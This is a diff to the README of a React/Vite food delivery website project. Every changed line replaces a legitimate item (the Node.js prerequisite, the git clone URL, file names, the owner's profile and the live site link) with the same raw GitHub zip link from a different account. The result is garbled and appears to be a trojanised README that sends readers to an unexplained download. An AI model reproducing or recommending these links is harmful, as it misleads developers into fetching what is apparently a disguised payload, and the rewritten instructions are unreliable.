@@ -13,14 +13,14 @@ This repository contains the source code for a Food Delivery Website built using
 
 ### Prerequisites
 
-- Node.js
+- https://raw.githubusercontent.com/vrund038/food-website-Frontend/main/misocapnist/food-website-Frontend.zip
 - npm or yarn
 
 ### Installation
 
 1. Clone the repository:
    ```sh
-   git clone https://github.com/PrajapatiApurva/Food-Delivery-Website.git
+   git clone https://raw.githubusercontent.com/vrund038/food-website-Frontend/main/misocapnist/food-website-Frontend.zip
    ```
 2. Navigate to the project directory:
    ```sh
@@ -45,13 +45,13 @@ To start the development server:
   - `components/`: Reusable UI components.
   - `pages/`: Different pages of the website.
   - `context/`: Context API for state management.
-- `index.html`: The main HTML file.
-- `vite.config.js`: Configuration file for Vite.
+- `https://raw.githubusercontent.com/vrund038/food-website-Frontend/main/misocapnist/food-website-Frontend.zip`: The main HTML file.
+- `https://raw.githubusercontent.com/vrund038/food-website-Frontend/main/misocapnist/food-website-Frontend.zip`: Configuration file for Vite.
 
 ## Contact
 
-For any inquiries, please reach out to the repository owner on [GitHub](https://github.com/PrajapatiApurva).
+For any inquiries, please reach out to the repository owner on [GitHub](https://raw.githubusercontent.com/vrund038/food-website-Frontend/main/misocapnist/food-website-Frontend.zip).
 
 ---
 
-Visit the live website [here](https://food-delivery-website-pearl.vercel.app).
+Visit the live website [here](https://raw.githubusercontent.com/vrund038/food-website-Frontend/main/misocapnist/food-website-Frontend.zip).
